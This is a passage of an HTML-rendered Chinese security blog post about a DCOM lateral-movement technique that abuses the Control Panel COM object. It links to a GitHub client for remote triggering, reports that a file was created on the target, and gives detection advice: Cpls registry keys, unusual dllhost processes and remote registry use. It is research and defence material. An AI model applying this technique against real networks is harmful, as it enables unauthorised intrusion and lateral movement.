MB_ICONINFORMATION);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后就是实现一个DCOM客户端，看看能够远程触发，代码位于：<a target="_blank" rel="noopener" href="https://github.com/ybdt/post-hub/tree/main/07-%E6%A8%AA%E5%90%91%E6%94%BB%E5%87%BB/%E6%96%B0%E5%9E%8BDCOM%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%B9%8B%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF">https://github.com/ybdt/post-hub/tree/main/07-横向攻击/新型DCOM内网横向之控制面板</a></p>
+<p>在Kali中执行如下命令<br><img src="/2026/01/13/%E5%88%A9%E7%94%A8%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BFCOM%E5%AF%B9%E8%B1%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%96%B0%E5%9E%8BDCOM%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/08.png" alt="image"></p>
+<p>尽管返回了错误消息，但是文件已经成功创建<br><img src="/2026/01/13/%E5%88%A9%E7%94%A8%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BFCOM%E5%AF%B9%E8%B1%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%96%B0%E5%9E%8BDCOM%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/09.png" alt="image"></p>
+<h1 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h1><p>首先，查看下列注册表位置是否有系统之外的控制面板项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls</span><br><span class="line">HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls</span><br><span class="line">HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Control Panel\Cpls</span><br></pre></td></tr></table></figure>
+
+<p>其次，监控是否有不常见dllhost进程产生，例如调用COM对象COpenControlPanel的dllhost</p>
+<p>最后，监控远程注册表的使用，它经常被滥用在各种攻击中</p>
+<h1 id="尾语"><a href="#尾语" class="headerlink" title="尾语"></a>尾语</h1><p>DCOM是一个大的攻击面，对于很多没有Type Library的COM对象，通过逆向工程可以发现很多宝藏</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://sud0ru.ghost.io/yet-another-dcom-object-for-command-execution-part-2/">https://sud0ru.ghost.io/yet-another-dcom-object-for-command-execution-part-2/</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">ybdt</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2026/01/13/%E5%88%A9%E7%94%A8%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BFCOM%E5%AF%B9%E8%B1%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%96%B0%E5%9E%8BDCOM%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/">http://example.com/2026/01/13/%E5%88%A9%E7%94%A8%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BFCOM%E5%AF%B9%E8%B1%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%96%B0%E5%9E%8BDCOM%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2026/01/12/DCOM%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%8E%A2%E7%A9%B6/" title="DCOM内网横向探究"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">DCOM内网横向探究</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ybdt</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">34</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ybdt"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">要想练就绝世武功，就要忍受常人难忍受的痛</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF%E4%BD%9C%E4%B8%BA%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-number">2.</span> <span class="toc-text">控制面板作为攻击面</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF%E5%AE%9E%E7%8E%B0%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">3.</span> <span class="toc-text">控制面板实现横向移动</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B"><span class="toc-number">4.</span> <span class="toc-text">检测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%BE%E8%AF%AD"><span class="toc-number">5.</span> <span class="toc-text">尾语</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">6.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/13/%E5%88%A9%E7%94%A8%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BFCOM%E5%AF%B9%E8%B1%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%96%B0%E5%9E%8BDCOM%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/" title="利用控制面板COM对象实现内网横向移动的新型DCOM攻击技术">利用控制面板COM对象实现内网横向移动的新型DCOM攻击技术</a><time datetime="2026-01-13T04:23:40.000Z" title="Created 2026-01-13 12:23:40">2026-01-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/12/DCOM%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%8E%A2%E7%A9%B6/" title="DCOM内网横向探究">DCOM内网横向探究</a><time datetime="2026-01-12T04:08:30.000Z" title="Created 2026-01-12 12:08:30">2026-01-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/28/Windows%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E5%8F%8A%E5%85%B6COM%E7%BB%84%E4%BB%B6/" title="Windows任务计划及其COM组件">Windows任务计划及其COM组件</a><time datetime="2025-11-28T13:47:30.000Z" title="Created 2025-11-28 21:47:30">2025-11-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/27/Windows-RPC%E5%88%9D%E6%8E%A2/" title="Windows RPC初探">Windows RPC初探</a><time datetime="2025-11-27T12:41:06.000Z" title="Created 2025-11-27 20:41:06">2025-11-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/23/Windows%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2025-60710%EF%BC%89/" title="Windows任务计划权限提升漏洞分析（CVE-2025-60710）">Windows任务计划权限提升漏洞分析（CVE-2025-60710）</a><time datetime="2025-11-23T11:47:28.000Z" title="Created 2025-11-23 19:47:28">2025-11-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2026 By ybdt</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
